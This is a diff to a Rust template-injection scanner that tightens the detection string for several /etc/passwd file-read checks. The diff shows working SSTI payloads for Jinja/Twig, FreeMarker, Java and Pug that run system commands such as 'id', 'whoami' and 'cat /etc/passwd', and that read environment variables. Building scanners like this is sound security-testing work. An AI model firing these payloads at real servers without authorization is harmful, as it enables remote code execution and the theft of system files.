@@ -131,7 +131,7 @@ impl SstiAdvancedScanner {
             (r#"{{['id']|filter('system')}}"#, "uid=", "System filter"),
             (
                 r#"{{['cat /etc/passwd']|filter('system')}}"#,
-                "root:",
+                "root:x:0:0:",
                 "File read",
             ),
             (
@@ -178,9 +178,9 @@ impl SstiAdvancedScanner {
             ("<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}", "uid=", "Execute utility RCE"),
             ("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.ProcessBuilder\",\"id\").start()}", "Process", "ProcessBuilder"),
             ("<#assign classloader=object?class.protectionDomain.classLoader>", "ClassLoader", "ClassLoader access"),
-            ("${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream()}", "root:", "File read"),
+            ("${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream()}", "root:x:0:0:", "File read"),
             ("${\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"id\")}", "Process", "Runtime exec"),
-            ("<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"cat /etc/passwd\")}", "root:", "File read via Execute"),
+            ("<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"cat /etc/passwd\")}", "root:x:0:0:", "File read via Execute"),
             ("${\"a\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('id')\")}", "Process", "ScriptEngine RCE"),
             ("<#assign uri=\"freemarker.template.utility.ObjectConstructor\"?new()>", "Constructor", "Object constructor"),
             ("${object?api.class.getResource(\"file:///etc/passwd\").getContent()}", "root", "Resource access"),
@@ -277,7 +277,7 @@ impl SstiAdvancedScanner {
             ("#{function(){return global.process.mainModule.require('child_process').execSync('whoami').toString()}()}", "root", "Whoami"),
             ("- var x = root.process.mainModule.require\n- x('child_process').exec('id')", "exec", "Multiline RCE"),
             ("#{root.process.mainModule.require('child_process').exec('id')}", "exec", "Root process"),
-            ("#{self.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()}", "root:", "File read"),
+            ("#{self.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()}", "root:x:0:0:", "File read"),
             ("#{global.process.env}", "PATH", "Environment access"),
         ];
 
